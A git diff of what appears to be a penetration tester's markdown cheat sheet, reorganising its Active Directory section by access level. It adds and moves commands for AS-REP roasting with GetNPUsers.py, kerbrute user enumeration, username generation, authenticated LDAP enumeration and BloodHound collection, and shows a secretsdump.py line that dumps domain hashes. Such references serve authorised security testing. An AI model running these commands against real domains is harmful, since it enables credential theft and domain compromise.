@@ -191,12 +191,6 @@ ldapenum -d $domain
 ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" "(objectclass=*)"
 ```
 
-#### Test for UF DONT REQUIRE PREAUTH
-
-```
-GetNPUsers.py $domain/ -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -dc-ip $ip
-```
-
 #### Test for zeroLogon
 
 ```
@@ -210,7 +204,29 @@ secretsdump.py -just-dc $domain/dc-name\$@$ip
 #### Enumerate Users
 
 ```
+/opt/username-anarchy/username-anarchy --input-file ./test-names.txt
+```
+
+```
 kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
+```
+
+### Active Directory Testing (Only User)
+
+#### Test for UF DONT REQUIRE PREAUTH
+
+```
+GetNPUsers.py $domain/ -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -dc-ip $ip
+```
+
+### Active Directory Testing (With Creds)
+
+```
+ldapenum -d $domain -u user -p password
+```
+
+```
+bloodhound-python -u username -p password  -d $domain -ns $ip -c all
 ```
 
 ### Web Application Testing
